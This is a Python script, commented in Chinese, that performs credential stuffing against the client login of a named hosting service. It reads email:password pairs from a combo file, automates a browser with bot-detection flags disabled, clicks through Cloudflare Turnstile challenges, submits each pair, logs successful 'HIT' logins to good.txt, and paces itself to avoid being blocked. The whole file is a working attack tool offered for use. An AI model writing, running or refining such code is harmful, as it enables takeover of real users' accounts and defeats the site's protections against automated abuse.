"""
花云 CF 绕过 + 批量登录验证 (最终版)
安装: pip install DrissionPage
运行前: taskkill /F /IM chrome.exe /T
"""

import sys
import os
import time
import random

try:
    from DrissionPage import ChromiumPage, ChromiumOptions
except ImportError:
    print("[!] pip install DrissionPage")
    sys.exit(1)

# ==================== 配置 ====================
TARGET_BASE = "https://api-flowercloud.com"
LOGIN_URL = TARGET_BASE + "/dologin.php"
LOGIN_PAGE = TARGET_BASE + "/index.php?rp=/login"
COMBO_FILE = "combo_f.txt"
GOOD_FILE = "good.txt"
BAD_FILE = "bad.txt"
MAX_CF_WAIT = 120
DELAY_BETWEEN = 3
CHROME_PATH = None
# ==============================================


def find_browser():
    paths = [
        r"C:\Program Files\Google\Chrome\Application\chrome.exe",
        r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
        r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
        r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
    ]
    for p in paths:
        if os.path.exists(p):
            return p
    return None


def is_challenge_page(page):
    try:
        title = page.title.lower() if page.title else ""
    except:
        return True
    signs = ["just a moment", "checking", "attention required", "please wait"]
    return any(s in title for s in signs)


def try_click_turnstile(page):
    try:
        iframes = page.eles("tag:iframe")
        for iframe in iframes:
            src = iframe.attr("src") or ""
            if "challenges.cloudflare.com" in src or "turnstile" in src:
                try:
                    iframe.click()
                    return True
                except:
                    pass
    except:
        pass

    try:
        cf_div = page.ele("css:.cf-turnstile", timeout=2)
        if cf_div:
            cf_div.click()
            return True
    except:
        pass

    return False


def wait_cf(page, max_wait=MAX_CF_WAIT):
    start = time.time()

    while time.time() - start < max_wait:
        if not is_challenge_page(page):
            return True

        try_click_turnstile(page)
        elapsed = int(time.time() - start)
        if elapsed % 10 == 0 and elapsed > 0:
            print("    ... CF 验证中 (" + str(elapsed) + "s)")
        time.sleep(3)

    return not is_challenge_page(page)


def ensure_cf_passed(page, url):
    """访问URL，如果碰到CF就等它过"""
    page.get(url)
    time.sleep(3)

    if is_challenge_page(page):
        print("    [*] CF 验证中...")
        passed = wait_cf(page)
        if passed:
            print("    [+] CF 通过!")
            time.sleep(2)
            return True
        else:
            print("    [!] CF 超时")
            return False
    return True


def do_login(page, email, password):
    """
    用 DrissionPage 在登录页填表单提交。
    花云 WHMCS 登录：
      - 登录页: /index.php?rp=/login
      - 表单 POST 到: /dologin.php
      - 字段: username, password
      - 成功跳转: /clientarea.php
      - 失败跳转: /clientarea.php?incorrect=true
    """
    # 先到登录页
    if not ensure_cf_passed(page, LOGIN_PAGE):
        return "error"

    time.sleep(2)

    # 等页面完全加载
    try:
        page.wait.doc_loaded(timeout=10)
    except:
        time.sleep(3)

    try:
        # 找邮箱/用户名输入框
        email_input = None
        for sel in ['#inputEmail', 'input[name="username"]', 'input[type="email"]', 'input[name="email"]']:
            email_input = page.ele(sel, timeout=3)
            if email_input:
                break

        if not email_input:
            print("    [!] 找不到邮箱输入框")
            print("    [debug] URL: " + str(page.url))
            return "error"

        # 找密码输入框
        pass_input = None
        for sel in ['#inputPassword', 'input[name="password"]', 'input[type="password"]']:
            pass_input = page.ele(sel, timeout=3)
            if pass_input:
                break

        if not pass_input:
            print("    [!] 找不到密码输入框")
            return "error"

        # 清空并输入邮箱
        email_input.click()
        time.sleep(0.2)
        email_input.clear()
        time.sleep(0.1)
        email_input.input(email)
        time.sleep(0.3)

        # 清空并输入密码
        pass_input.click()
        time.sleep(0.2)
        pass_input.clear()
        time.sleep(0.1)
        pass_input.input(password)
        time.sleep(0.5)

        # 找登录按钮并点击
        btn = None
        for sel in ['input[type="submit"]', 'button[type="submit"]', '#login', 'input[value="Login"]', 'input[value="登录"]']:
            btn = page.ele(sel, timeout=2)
            if btn:
                break

        if btn:
            btn.click()
        else:
            # 没找到按钮就回车提交
            pass_input.input("{Enter}")

        # 等待页面跳转
        time.sleep(4)

        # 登录后可能触发 CF
        if is_challenge_page(page):
            print("    [*] 登录后触发CF...")
            wait_cf(page, 60)
            time.sleep(3)

        # 判断结果 - 基于 URL
        final_url = page.url if page.url else ""

        if "incorrect=true" in final_url:
            return "bad"

        if "clientarea.php" in final_url and "incorrect" not in final_url and "login" not in final_url:
            return "good"

        # 再看页面内容
        page_text = page.html.lower() if page.html else ""

        if "logout.php" in page_text:
            return "good"

        if "incorrect" in page_text or "invalid" in page_text:
            return "bad"

        # 不确定
        print("    [?] URL: " + final_url[:80])
        return "bad"

    except Exception as e:
        print("    [!] 异常: " + str(e))
        return "error"


def save_result(filename, content):
    f = open(filename, "a", encoding="utf-8")
    f.write(content)
    f.write(os.linesep)
    f.close()


def main():
    print("")
    print("  =============================================")
    print("    花云 CF 绕过 + 批量登录 (最终版)")
    print("  =============================================")
    print("")

    if not os.path.exists(COMBO_FILE):
        print("[!] 找不到 " + COMBO_FILE)
        print("[!] 请确保 combo_f.txt 和本脚本在同一目录")
        sys.exit(1)

    f = open(COMBO_FILE, "r", encoding="utf-8")
    lines = [l.strip() for l in f.readlines() if ":" in l.strip()]
    f.close()

    if not lines:
        print("[!] combo 文件为空或格式不对")
        sys.exit(1)

    print("[+] 加载 " + str(len(lines)) + " 个账号")

    global CHROME_PATH
    if not CHROME_PATH:
        CHROME_PATH = find_browser()
    if not CHROME_PATH:
        print("[!] 找不到浏览器")
        sys.exit(1)
    print("[+] 浏览器: " + CHROME_PATH)

    print("[*] 启动浏览器...")
    co = ChromiumOptions()
    co.set_browser_path(CHROME_PATH)
    co.set_argument("--start-maximized")
    co.set_argument("--disable-blink-features=AutomationControlled")
    co.set_argument("--no-first-run")
    co.set_argument("--no-default-browser-check")

    try:
        page = ChromiumPage(co)
    except Exception as e:
        print("[!] 启动失败: " + str(e))
        print("[*] 先运行: taskkill /F /IM chrome.exe /T")
        sys.exit(1)

    print("[+] 浏览器OK")

    # 首次过CF
    print("[*] 首次访问过CF...")
    page.get(TARGET_BASE + "/clientarea.php")
    time.sleep(3)

    if is_challenge_page(page):
        print("[*] 检测到CF，尝试自动点击...")
        passed = wait_cf(page)
        if not passed:
            print("[!] 自动过盾失败")
            print("[*] 请在Chrome窗口手动点击验证框，然后按Enter...")
            input()
    else:
        print("[+] CF已通过")

    print("")
    print("[+] 开始批量登录")
    print("=" * 50)
    print("")

    good = 0
    bad = 0
    err = 0
    total = len(lines)

    for i, line in enumerate(lines):
        parts = line.split(":", 1)
        if len(parts) != 2:
            continue

        email = parts[0].strip()
        password = parts[1].strip()

        print("[" + str(i+1) + "/" + str(total) + "] " + email)

        result = do_login(page, email, password)

        if result == "good":
            good += 1
            print("    >>> HIT <<<")
            save_result(GOOD_FILE, line)
        elif result == "bad":
            bad += 1
            print("    --- BAD ---")
            save_result(BAD_FILE, line)
        else:
            err += 1
            print("    !!! ERROR !!!")
            save_result(BAD_FILE, line)

        print("    [H:" + str(good) + " B:" + str(bad) + " E:" + str(err) + " / " + str(i+1) + "]")
        print("")

        # 每个账号之间随机等待
        if i < total - 1:
            time.sleep(random.uniform(DELAY_BETWEEN, DELAY_BETWEEN + 2))

        # 每50个账号暂停久一点避免被封
        if (i + 1) % 50 == 0:
            pause = random.uniform(10, 20)
            print("[*] 已处理 " + str(i+1) + " 个，暂停 " + str(int(pause)) + " 秒...")
            time.sleep(pause)

    print("=" * 50)
    print("  全部完成!")
    print("  HIT:   " + str(good) + " -> " + GOOD_FILE)
    print("  BAD:   " + str(bad) + " -> " + BAD_FILE)
    print("  ERROR: " + str(err))
    print("  总计:  " + str(total))
    print("=" * 50)

    page.quit()


if __name__ == "__main__":
    main()
